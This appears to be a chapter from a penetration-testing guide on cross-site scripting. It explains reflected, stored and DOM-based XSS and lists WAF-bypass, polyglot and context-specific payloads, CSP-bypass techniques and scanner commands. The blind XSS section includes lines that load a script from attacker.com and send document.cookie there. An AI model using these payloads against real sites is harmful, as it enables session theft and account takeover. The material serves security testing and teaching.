# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a client-side code injection vulnerability where an attacker injects malicious scripts into web pages viewed by other users.

## Types of XSS

### Reflected XSS
The injected script is reflected off the web server, such as in an error message, search result, or any response that includes user input.

**Detection:**
- Input reflected in response without sanitization
- Parameters, headers, URL path injection points

**Classic payload:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Stored XSS
The injected script is permanently stored on the target server (database, message forum, comment field) and served to users who access the stored data.

**Detection:**
- Input stored and displayed to other users
- Comments, profiles, posts, reviews

### DOM-based XSS
The vulnerability exists in client-side JavaScript rather than server-side. The page never sends the payload to the server — it's processed entirely in the DOM.

**Detection:**
- JavaScript reads from `location.hash`, `document.URL`, `location.search`, `document.referrer`, `window.name`
- Data flows to `innerHTML`, `document.write`, `eval`, `setTimeout`, `jQuery.html()`

## Advanced XSS Techniques

### WAF Bypass Patterns

**Event handler obfuscation:**
```
<svg/onload=eval(name)>
<Body OnLoAd=alert(1)>
<INPUT onfocus="alert(1)" autofocus>
```

**Encoding bypass:**
```
%3Cscript%3Ealert(1)%3C/script%3E
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

**Polyglot payloads:**
```
jaVasCript:/*-/*`/*\x60/*\x27/*'/*\x22/*/**/(*/oNcliCk=alert() )//%0D%0A%0D%0A//--></script></title></textarea></style></template></noscript><svg/onload=alert(1)>
```

### CSP Bypass
- **Angular expressions**: `{{constructor.constructor('alert(1)')()}}`
- **JSONP endpoints** on same origin (Google, Akamai)
- **File upload** with script content
- **Dangling markup** injection when script execution is blocked
- **Base tag injection** (change relative script sources)
- **MIME sniffing** with polyglot files

### Blind XSS
XSS that fires in an internal application (admin panel, ticketing system).

**Tools:** `xsshunter`, `interactsh`, `Burp Collaborator`

```html
<script src=https://attacker.com/steal.js></script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

## Detection Methodology

### Automated
```bash
# Scan with Dalfox
dalfox url https://target.com/search?q=test

# Scan with nuclei
nuclei -l urls.txt -t ~/nuclei-templates/vulnerabilities/generic/xss.yaml

# Param-based scanning with XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"
```

### Manual
1. **Identify reflection points** — Input that appears in the response
2. **Test context**:
   - Between HTML tags: `<script>alert(1)</script>`
   - In attribute: `"><img src=x onerror=alert(1)>`
   - In JavaScript string: `';alert(1);//`
   - In CSS: `</style><script>alert(1)</script>`
3. **Check filtering** — Try different cases, encoding, event handlers

## Context-Specific Payloads

| Context | Example Payload |
|---------|----------------|
| Between HTML tags | `<script>alert(1)</script>` |
| HTML attribute | `" autofocus onfocus=alert(1) x="` |
| JavaScript string | `'-alert(1)-'` |
| JavaScript template literal | `${alert(1)}` |
| URL | `javascript:alert(1)` |
| Style tag | `</style><script>alert(1)</script>` |
| Comments | `--><script>alert(1)</script>` |

## Tools

| Tool | Purpose |
|------|---------|
| **Dalfox** | Fast XSS scanner with parameter analysis |
| **XSStrike** | Advanced XSS detection with payload generation |
| **Burp Suite** | Manual + semi-automated testing |
| **xsshunter** | Blind XSS callback collection |
| **Nuclei** | Template-based scanner |

---

> **Next**: [SQL Injection](03-sql-injection.md)
